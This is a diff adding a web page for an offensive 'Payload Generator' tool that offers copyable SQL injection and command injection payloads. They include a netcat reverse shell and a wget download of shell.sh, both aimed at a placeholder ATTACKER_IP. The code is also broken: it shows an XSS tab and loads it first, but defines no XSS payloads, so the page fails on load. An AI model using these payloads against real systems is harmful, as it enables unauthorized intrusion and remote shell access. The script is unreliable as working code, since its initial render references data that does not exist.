@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload Generator - Payload Alchemist</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+
+        .font-archivo {
+            font-family: 'Archivo Black', sans-serif;
+        }
+
+        /* Gradient animation for the heading */
+        .animated-gradient {
+            background: linear-gradient(90deg, #00f, #0ff, #f0f, #ff0);
+            background-size: 300% auto;
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: animate-gradient 5s linear infinite;
+        }
+
+        @keyframes animate-gradient {
+            0% { background-position-x: 0%; }
+            100% { background-position-x: 100%; }
+        }
+
+        /* Custom scrollbar */
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 8px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        /* Tab styling */
+        .tab-btn {
+            transition: all 0.3s ease;
+            border-bottom: 2px solid transparent;
+        }
+        .tab-btn.active {
+            color: #0ff;
+            border-bottom-color: #0ff;
+        }
+    </style>
+</head>
+<body class="bg-black text-gray-200 overflow-hidden">
+
+    <!-- Background Spline Wave -->
+    <iframe
+        class="absolute top-0 left-0 w-full h-full z-0 pointer-events-none"
+        src="https://my.spline.design/claritystream-44SGA95cHaoIsXYF7fxF28Fj/"
+        frameborder="0">
+    </iframe>
+
+    <!-- Main Container -->
+    <div class="relative z-10 flex w-full h-screen p-4 sm:p-6 md:p-8 gap-4 sm:gap-6 md:gap-8">
+
+        <!-- Left Sidebar -->
+        <aside class="w-1/4 lg:w-1/5 h-full bg-white/5 backdrop-blur-md rounded-2xl p-6 flex flex-col gap-6 shadow-2xl shadow-black/20">
+            <h2 class="font-bold text-xl text-white border-b border-white/10 pb-4">Tools</h2>
+            <ul class="space-y-3 text-gray-300">
+                <li><a href="index.html" class="hover:text-cyan-400 transition-colors">Scanner</a></li>
+                <li><a href="payload-generator.html" class="text-cyan-400 font-bold">Payload Generator</a></li>
+                <li><a href="#" class="hover:text-cyan-400 transition-colors">History</a></li>
+            </ul>
+            <div class="mt-auto">
+                 <h2 class="font-bold text-xl text-white border-b border-white/10 pb-4 mb-4">Settings</h2>
+                 <ul class="space-y-3 text-gray-300">
+                    <li><a href="user-details.html" class="hover:text-cyan-400 transition-colors">User Details</a></li>
+                    <li><a href="#" class="hover:text-cyan-400 transition-colors">Preferences</a></li>
+                </ul>
+            </div>
+        </aside>
+
+        <!-- Main Content: Payload Generator -->
+        <main class="w-3/4 lg:w-4/5 h-full flex flex-col gap-6">
+            <div class="w-full bg-white/5 backdrop-blur-md rounded-2xl p-6 md:p-8 shadow-2xl shadow-black/20">
+                <h1 class="font-archivo text-4xl sm:text-5xl animated-gradient mb-6">Payload Generator</h1>
+                <div id="tabs" class="flex gap-6 border-b border-white/10 mb-6">
+                    <button class="tab-btn py-2 text-lg font-bold active" data-tab="xss">XSS</button>
+                    <button class="tab-btn py-2 text-lg font-bold" data-tab="sqli">SQLi</button>
+                    <button class="tab-btn py-2 text-lg font-bold" data-tab="cmd">Command Injection</button>
+                </div>
+            </div>
+
+            <div class="w-full h-full flex-grow bg-white/5 backdrop-blur-md rounded-2xl p-6 md:p-8 shadow-2xl shadow-black/20 flex flex-col">
+                <div class="flex-grow flex gap-6 overflow-hidden">
+                    <!-- Payload List -->
+                    <div id="payload-list" class="w-1/3 overflow-y-auto custom-scrollbar pr-4">
+                        <!-- Content will be dynamically inserted here -->
+                    </div>
+
+                    <!-- Payload Display & Options -->
+                    <div class="w-2/3 flex flex-col">
+                        <h3 class="text-xl font-bold text-white mb-4">Generated Payload</h3>
+                        <textarea id="payload-output" readonly class="w-full h-48 p-4 rounded-lg bg-black/30 border border-white/10 font-mono text-cyan-300 resize-none custom-scrollbar"></textarea>
+                        <button id="copy-payload-btn" class="mt-4 w-full px-5 py-3 bg-cyan-500/20 border border-cyan-400 text-cyan-300 rounded-lg font-bold text-lg hover:bg-cyan-500/30 transition-all">Copy Payload</button>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+    
+    <script>
+        const payloads = {
+            sqli: [
+                { name: 'Basic Union Select', payload: "' UNION SELECT 1,2,3--" },
+                { name: 'Error-Based', payload: "' OR 1=1--" },
+                { name: 'Blind Boolean', payload: "' AND 1=1--" },
+                { name: 'Time-Based Blind', payload: "' OR IF(1=1, SLEEP(5), 0)--" },
+                { name: 'Stacked Query', payload: "'; SELECT pg_sleep(5)--" },
+                { name: 'Auth Bypass', payload: "' OR '1'='1" },
+            ],
+            cmd: [
+                { name: 'List Files (ls)', payload: '; ls -la' },
+                { name: 'Whoami', payload: '; whoami' },
+                { name: 'Ping Localhost', payload: '; ping -c 5 127.0.0.1' },
+                { name: 'Netcat Reverse Shell', payload: '; nc -e /bin/sh ATTACKER_IP 4444' },
+                { name: 'Wget File Download', payload: '; wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh' },
+            ]
+        };
+
+        const tabsContainer = document.getElementById('tabs');
+        const payloadListDiv = document.getElementById('payload-list');
+        const payloadOutput = document.getElementById('payload-output');
+        const copyBtn = document.getElementById('copy-payload-btn');
+
+        function renderPayloads(type) {
+            payloadListDiv.innerHTML = '';
+            payloads[type].forEach(p => {
+                const button = document.createElement('button');
+                button.textContent = p.name;
+                button.className = 'block w-full text-left p-3 rounded-md hover:bg-white/10 transition-colors';
+                button.onclick = () => {
+                    payloadOutput.value = p.payload;
+                    // Highlight selected button
+                    document.querySelectorAll('#payload-list button').forEach(btn => btn.classList.remove('bg-cyan-500/20'));
+                    button.classList.add('bg-cyan-500/20');
+                };
+                payloadListDiv.appendChild(button);
+            });
+            // Select the first payload by default
+            if (payloadListDiv.firstChild) {
+                payloadListDiv.firstChild.click();
+            }
+        }
+
+        tabsContainer.addEventListener('click', (e) => {
+            if (e.target.matches('.tab-btn')) {
+                document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+                e.target.classList.add('active');
+                const tabType = e.target.getAttribute('data-tab');
+                renderPayloads(tabType);
+            }
+        });
+
+        copyBtn.addEventListener('click', function() {
+            if (!payloadOutput.value) return;
+            const textArea = document.createElement('textarea');
+            textArea.value = payloadOutput.value;
+            document.body.appendChild(textArea);
+            textArea.select();
+            try {
+                document.execCommand('copy');
+                copyBtn.textContent = 'Copied!';
+                setTimeout(() => { copyBtn.textContent = 'Copy Payload'; }, 2000);
+            } catch (err) {
+                console.error('Failed to copy text: ', err);
+                copyBtn.textContent = 'Failed!';
+                setTimeout(() => { copyBtn.textContent = 'Copy Payload'; }, 2000);
+            }
+            document.body.removeChild(textArea);
+        });
+
+        // Initial load
+        renderPayloads('xss');
+
+    </script>
+</body>
+</html>
